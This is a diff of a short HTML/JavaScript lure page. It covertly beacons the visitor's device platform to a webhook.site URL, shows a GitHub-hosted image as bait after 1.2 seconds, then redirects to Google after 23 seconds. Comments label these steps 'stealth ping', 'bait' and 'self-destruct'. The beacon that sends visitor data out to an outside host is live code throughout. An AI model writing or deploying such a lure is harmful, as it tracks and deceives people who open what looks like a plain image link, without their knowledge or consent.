@@ -1,17 +1,17 @@
 <script>
     function runPayload() {
+        // MATCHING YOUR ACTIVE DASHBOARD ID
         var webhookURL = "https://webhook.site/7132896c-9333-427f-b7c5-6eaac30219c6?status=landed&device=" + navigator.platform;
 
-        // 1. THE STEALTH PING (Professional Background Beacon)
-        // This is the industry standard for sending data without page errors
+        // THE STEALTH PING
         navigator.sendBeacon(webhookURL);
 
-        // 2. THE BAIT: Show the image after 1.2 seconds
+        // THE BAIT (Redirect to image after 1.2s)
         setTimeout(function() {
             window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
         }, 1200);
 
-        // 3. THE SELF-DESTRUCT: Vanish after 23 seconds
+        // SELF-DESTRUCT (Go to Google after 23s)
         setTimeout(function() {
             window.location.href = "https://www.google.com";
         }, 23000);
